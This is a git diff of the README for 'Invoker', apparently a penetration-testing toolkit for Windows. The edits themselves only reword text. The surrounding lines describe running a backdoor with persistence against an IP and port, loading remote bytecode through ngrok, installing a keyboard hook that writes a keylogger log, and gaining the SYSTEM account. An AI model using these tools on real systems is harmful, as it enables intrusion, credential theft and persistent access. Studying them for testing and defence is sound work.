@@ -28,7 +28,7 @@ Capabilities:
 
 Built with Dev-C++ IDE v5.11 (64-bit), compiled with TDM-GCC v4.9.2 (32-bit and 64-bit) and tested on Windows 10 Enterprise OS (64-bit). Download Dev-C++ from [here](https://sourceforge.net/projects/orwelldevcpp/files/Portable%20Releases/).
 
-**NEW: Visual Studio Community 2019 v16.7.6 projects included.**
+**NEW: Visual Studio Community 2019 v16.7.6 projects added.**
 
 Made for educational purposes. I hope it will help!
 
@@ -49,8 +49,6 @@ Run [\\exec\\Invoker_x86.exe](https://github.com/ivan-sincek/invoker/tree/master
 To automate the backdoor while setting up a persistence, you can run the following command:
 
 ```fundamental
-Invoker_x86.exe 192.168.8.5 9000
-
 Invoker_x64.exe 192.168.8.5 9000
 ```
 
@@ -89,7 +87,7 @@ Also, check an additional example at [pastebin.com/raw/iW17rCxH](https://pastebi
 
 Bytecode provided will most certainly not work for you.
 
-P.S. Pastebin no longer works because it now redirects HTTP to HTTPS.
+**Pastebin no longer works because it now redirects HTTP to HTTPS.**
 
 Use [ngrok](https://ngrok.com) to give your local web server a public address.
 
@@ -109,11 +107,11 @@ Check all the PowerShell scripts used in the main C++ program [here](https://git
 
 Find out how to make a DLL with a hook procedure [here](https://github.com/ivan-sincek/invoker/blob/master/src/Dev-C%2B%2B/InvokerHook/dllmain.cpp).
 
-Hook procedure will invoke a message box on each window close.
+The hook procedure will invoke a message box on each window close.
 
 Also, check out a keyboard hook procedure [here](https://github.com/ivan-sincek/invoker/blob/master/src/Dev-C%2B%2B/KeyboardHook/dllmain.cpp).
 
-P.S. Make sure to remove all the created artifacts after you are done testing, e.g. remove `keylogger.log`.
+**Make sure to remove all the created artifacts after you are done testing, e.g. remove `keylogger.log`.**
 
 ## Get the LocalSystem Account (NT AUTHORITY\SYSTEM)
 
